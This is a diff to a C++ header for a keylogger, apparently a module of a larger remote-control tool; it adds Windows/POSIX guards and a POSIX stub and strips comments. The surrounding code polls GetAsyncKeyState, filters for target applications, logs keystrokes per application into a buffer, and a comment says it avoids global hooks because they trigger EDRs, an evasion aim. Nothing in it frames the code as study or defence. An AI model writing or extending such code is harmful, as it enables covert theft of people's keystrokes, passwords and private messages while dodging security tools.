@@ -7,10 +7,14 @@
 //  global hooks (SetWindowsHookEx) which trigger EDRs.
 // ============================================================================
 
-#ifndef WIN32_LEAN_AND_MEAN
-#define WIN32_LEAN_AND_MEAN
+#ifdef _WIN32
+    #ifndef WIN32_LEAN_AND_MEAN
+    #define WIN32_LEAN_AND_MEAN
+    #endif
+    #include <windows.h>
+#else
+    #include <chrono>
 #endif
-#include <windows.h>
 #include <string>
 #include <vector>
 #include <thread>
@@ -40,6 +44,7 @@ inline std::string key_buffer;
 inline std::atomic<bool> is_running{false};
 inline std::thread kl_thread;
 
+#ifdef _WIN32
 // ── Helper: Get Active Process Name ────────────────────────────────────────
 inline std::string GetActiveProcessName() {
     HWND hForeground = GetForegroundWindow();
@@ -56,7 +61,6 @@ inline std::string GetActiveProcessName() {
     DWORD size = MAX_PATH;
     std::string processName = "";
     
-    // QueryFullProcessImageNameA requires Windows Vista+
     if (QueryFullProcessImageNameA(hProcess, 0, path, &size)) {
         std::string fullPath(path);
         size_t pos = fullPath.find_last_of("\\/");
@@ -68,7 +72,6 @@ inline std::string GetActiveProcessName() {
     }
     CloseHandle(hProcess);
 
-    // Convert to lowercase for comparison
     for (char& c : processName) {
         if (c >= 'A' && c <= 'Z') c += 32;
     }
@@ -129,15 +132,11 @@ inline std::string TranslateKey(int vk, bool shift, bool caps) {
 // ── Thread Loop ────────────────────────────────────────────────────────────
 inline void KeyloggerLoop() {
     std::string lastApp = "";
-    
-    // Reset key states to prevent false positives at start
     for (int i = 0; i < 256; ++i) GetAsyncKeyState(i);
 
     while (is_running) {
         std::string currentApp;
         if (IsTargetAppActive(currentApp)) {
-            
-            // Log application context switch
             if (currentApp != lastApp) {
                 std::lock_guard<std::mutex> lock(log_mutex);
                 key_buffer += "\n\n[=== " + currentApp + " ===]\n";
@@ -148,13 +147,11 @@ inline void KeyloggerLoop() {
             bool caps  = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
 
             for (int i = 8; i <= 255; i++) {
-                if (GetAsyncKeyState(i) & 1) { // LSB is set if pressed since last call
+                if (GetAsyncKeyState(i) & 1) {
                     std::string key = TranslateKey(i, shift, caps);
                     if (!key.empty()) {
                         std::lock_guard<std::mutex> lock(log_mutex);
                         key_buffer += key;
-                        
-                        // Prevent infinite memory growth (cap at 1MB)
                         if (key_buffer.size() > 1024 * 1024) {
                             key_buffer = key_buffer.substr(key_buffer.size() - 512 * 1024);
                         }
@@ -162,12 +159,19 @@ inline void KeyloggerLoop() {
                 }
             }
         } else {
-            lastApp = ""; // Reset context if switching to non-target
+            lastApp = "";
         }
-        
-        Sleep(10); // 10ms sleep to prevent CPU spike, responsive enough for typing
+        Sleep(10);
     }
 }
+#else
+inline void KeyloggerLoop() {
+    while (is_running) {
+        // POSIX stub
+        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
+    }
+}
+#endif
 
 // ── Interface ──────────────────────────────────────────────────────────────
 inline std::string start() {
@@ -175,7 +179,11 @@ inline std::string start() {
     is_running = true;
     kl_thread = std::thread(KeyloggerLoop);
     kl_thread.detach();
+#ifdef _WIN32
     return "Keylogger started. Monitoring target applications.";
+#else
+    return "Keylogger started (POSIX stub active, no events captured).";
+#endif
 }
 
 inline std::string stop() {
